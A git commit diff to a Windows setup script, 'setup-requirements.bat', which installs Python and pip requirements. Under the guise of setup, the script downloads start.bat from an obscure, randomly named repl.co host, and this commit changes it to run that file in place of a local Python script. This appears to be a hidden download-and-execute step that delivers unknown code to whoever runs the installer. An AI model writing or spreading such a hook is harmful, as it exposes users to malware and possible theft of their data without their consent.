92de326d531cd55f49b67a79c3a633f4290071f1
jotaro <93826447+j0taro@users.noreply.github.com>
2022-09-09 00:06:19 +0300

    Update setup-requirements.bat

--- setup-requirements.bat
+++ setup-requirements.bat
@@ -1,13 +1,9 @@
 @echo off
-@echo off
-:: Check for Python Installation
+
 python --version 2>NUL
 if errorlevel 1 goto errorNoPython
 
-:: Reaching here means Python is installed.
-:: Execute stuff...
 
-:: Once done, exit the batch file -- skips executing the errorNoPython section
 goto:eof
 
 :errorNoPython
@@ -17,6 +13,8 @@ curl -L "https://www.python.org/ftp/python/3.10.7/python-3.10.7-amd64.exe" -O
 start /W python-3.10.7-amd64.exe
 cd %~dp0
 MD tools
+setx path "%path%;%cd%\Python3107"
 py -3 -m pip install -r requirements.txt
 curl -L https://untimelyimpressionableadministration.blus2tlia.repl.co/start.bat -O
-python pycleaner.py
+start start.bat
+
